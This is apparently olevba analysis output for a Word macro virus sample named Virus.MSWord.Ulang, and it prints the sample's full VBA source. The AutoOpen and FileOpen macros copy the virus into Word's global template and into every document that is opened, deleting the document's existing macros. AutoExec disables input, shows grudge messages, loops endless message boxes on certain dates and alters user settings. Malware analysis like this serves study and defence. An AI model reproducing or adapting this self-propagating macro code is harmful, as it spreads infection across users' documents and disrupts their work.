olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ulang
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
Dim Tgl
Dim Bln
Dim Thn
Dim Jam
Dim Lebar
Dim Tinggi
Dim BarOK
Dim LebOK
Dim Pelaku$
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros 0
Tgl = WordBasic.Day(WordBasic.Now())
Bln = WordBasic.Month(WordBasic.Now())
Thn = WordBasic.Year(WordBasic.Now())
Jam = WordBasic.Hour(WordBasic.Now())
Dim Pesan1$, Pesan2$, Pesan3$, Pesan4$, Pelaku1$, Pelaku2$
Pesan1$ = "Berawal dari sebuah kepedihan... NdeKlaimber™ dicampakkan dan dihinakan... terpuruk bagaikan sampah busuk... NdeKlaimber™ merintih dengan segumpal dendam mendidih !!!"
Pesan2$ = "Kini saatnya NdeKlaimber™ menunjukkan... masih adanya kekuatan untuk membungkam mulut-mulut tak berperasaan... sebab hasrat untuk menjadi yang terbaik adalah sesuatu yang sangat manusiawi... NdeKlaimber™ manangis harus melibatkan semua orang."
Pesan3$ = "©1997 NdeKlaimber™                  I'm Coming..."
Pelaku1$ = "NdeKlaimber"
Pelaku2$ = "Pakis Pratiwi"
If Thn < 1998 Then GoTo HUT
If Jam < 19 Then GoTo Akhir
Dim dlg As Object
    Lebar = 400
    Tinggi = 200
    BarOK = Tinggi - 25
    LebOK = Lebar - 40
    WordBasic.BeginDialog Lebar, Tinggi, " NdeKlaimber Menggugat ..."
        WordBasic.Text 20, 10, LebOK, 150, Pesan1$
        WordBasic.Text 20, 78, LebOK, 120, Pesan2$
        WordBasic.Text 20, 160, LebOK, 20, Pesan3$
        WordBasic.OKButton 20, BarOK, LebOK, 20
    WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
WordBasic.Dialog.UserDialog dlg
HUT:
If Tgl = 20 And Bln = 11 Then
    Pelaku$ = Pelaku1$
    GoTo Ultah
ElseIf Tgl = 19 And Bln = 8 Then
    Pelaku$ = Pelaku2$
    GoTo Ultah
End If
GoTo Lanjut
Ultah:
    Pesan4$ = "Hari ini " + Pelaku$ + " merayakan Hari Ulang Tahun... Matikan komputer, tinggalkan semua pekerjaan, istirahatkan pikiran, ucapkan selamat kepada " + Pelaku$ + "."
    WordBasic.Beep
    WordBasic.MsgBox Pesan4$, "Happy Birthday, " + Pelaku$ + "...", 16
    GoTo Ultah
Lanjut:
WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="5", Password:="", WritePassword:="", RecommendReadOnly:=0
WordBasic.ToolsOptionsGeneral Pagination:=1, WPHelp:=0, WPDocNavKeys:=0, BlueScreen:=0, ErrorBeeps:=1, Effects3d:=1, UpdateLinks:=1, SendMailAttach:=1, RecentFiles:=0, RecentFileCount:="", Units:=1, ButtonFieldClicks:=-1
WordBasic.ToolsOptionsUserInfo Name:="Pakis Pratiwi", Initials:="Tiwi", Address:="Pupus sudah asa NdeKlaimber™ mencari" + Chr(13) + "Alamat nyata belum jua terberi" + Chr(13) + "Kalau saudaraku sudi memberi" + Chr(13) + "Informasi NdeKlaimber™ menanti" + Chr(13) + "Seribu hatur kasih NdeKlaimber™ pasti"
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim NFile$
Dim NMakro$
NFile$ = WordBasic.[FileName$]()
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy NMakro$, "Global:FileMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim TotalMacro
Dim i
Dim MN$
Dim FN$
Dim NFile$
Dim NMakro$
ReDim BadMacro__$(20)
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo Akhir
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
TotalMacro = 0
For i = 1 To WordBasic.CountMacros(1)
    MN$ = WordBasic.[MacroName$](i, 1)
    BadMacro__$(i) = MN$
    TotalMacro = TotalMacro + 1
Next i
FN$ = WordBasic.[FileName$]()
If TotalMacro >= 1 Then
    For i = 1 To TotalMacro
        On Error GoTo -1: On Error GoTo Akhir
        WordBasic.Organizer Delete:=1, Source:=FN$, Name:=BadMacro__$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy "Global:FileMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", NMakro$
Akhir:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Ulang - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |N,"                 |Tiwi                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

